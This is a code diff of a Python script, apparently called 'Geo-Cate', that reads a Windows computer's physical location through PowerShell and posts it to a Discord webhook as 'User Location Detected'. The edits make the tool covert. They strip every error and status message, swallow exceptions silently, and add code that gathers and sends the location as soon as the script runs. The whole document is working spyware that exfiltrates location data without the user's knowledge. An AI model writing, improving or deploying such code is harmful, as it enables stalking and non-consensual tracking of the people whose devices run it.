@@ -1,9 +1,12 @@
 import subprocess
 import json
 import requests
-from datetime import datetime
-#replace webhookurl with your webhook
-WEBHOOK_URL = "webhookurl"
+from datetime import datetime, timezone
+
+WEBHOOK_URL = ""
+CUSTOM_USERNAME = "Geo-Cate"  
+CUSTOM_AVATAR_URL = "https://img.icons8.com/?size=512w&id=53430&format=png"  
+
 def get_windows_location():
     try:
         powershell_script = """
@@ -34,22 +37,22 @@ def get_windows_location():
             raise Exception("Location is unknown.")
         location_data["Timestamp"] = convert_timestamp(location_data["Timestamp"])
         return location_data
-    except Exception as e:
-        print(f"Error fetching location: {e}")
+    except Exception:
         return None
 
 def convert_timestamp(timestamp):
     try:
         milliseconds = int(timestamp.strip("/Date()"))
-        return datetime.utcfromtimestamp(milliseconds / 1000).strftime("%Y-%m-%d %H:%M:%S UTC")
-    except Exception as e:
+        return datetime.fromtimestamp(milliseconds / 1000, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+    except Exception:
         return "Invalid timestamp"
 
 def send_to_discord(location):
     if not location:
-        print("No location data to send.")
         return
     payload = {
+        "username": CUSTOM_USERNAME,
+        "avatar_url": CUSTOM_AVATAR_URL,
         "content": "📍 **User Location Detected**",
         "embeds": [
             {
@@ -64,5 +67,11 @@ def send_to_discord(location):
         ],
     }
     response = requests.post(WEBHOOK_URL, json=payload)
-    if response.status_code == 204:
-   
+    if response.status_code != 204:
+        pass
+
+try:
+    location = get_windows_location()
+    send_to_discord(location)
+except Exception:
+    pass
